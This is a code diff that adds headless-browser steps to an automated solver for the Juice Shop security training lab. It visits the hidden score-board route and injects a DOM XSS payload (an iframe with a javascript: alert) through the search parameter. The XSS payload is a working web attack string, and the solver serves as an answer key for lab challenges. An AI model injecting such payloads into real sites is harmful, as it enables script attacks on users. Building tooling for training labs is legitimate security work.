@@ -621,6 +621,32 @@ def _local_file_read(c):
             pass
 
 
+_BROWSER_SOLVE_JS = r"""
+export default async function ({ page }) {
+  const base = %TARGET_JSON%;
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  const nav = async (u) => { try { await page.goto(base + u, { waitUntil: 'domcontentloaded', timeout: 12000 }); await sleep(1200); } catch (e) {} };
+  await nav("/#/score-board");                                                                // Score Board (hidden client route)
+  await nav('/#/search?q=' + encodeURIComponent('<iframe src="javascript:alert(`xss`)">'));   // DOM XSS -- real render
+  return { ok: true };
+}
+"""
+
+
+def _browser_solves(base):
+    """Browser-driven solves for client-side-only challenges (Score Board, DOM XSS) that HTTP can't
+    reach. Runs only when a headless browser is configured (CDP_BROWSER_URL / the headless-chrome
+    sidecar); degrades silently otherwise so the HTTP pack is never affected."""
+    import os
+    if not os.environ.get("CDP_BROWSER_URL"):
+        return
+    try:
+        import browser_engine
+        browser_engine.drive(base, _BROWSER_SOLVE_JS)
+    except Exception:
+        pass
+
+
 def solve(base_url: str) -> dict:
     """Run the full Juice Shop lab solver against a live instance; report scoreboard delta."""
     try:
@@ -654,6 +680,7 @@ def solve(base_url: str) -> dict:
                 step(c, AH)
             except Exception:
                 pass
+        _browser_solves(base)
         after = _board(c)
         return {"lab": "juiceshop", "before": len(before), "after": len(after),
                 "total": 113, "percent": round(100 * len(after) / 113, 1),
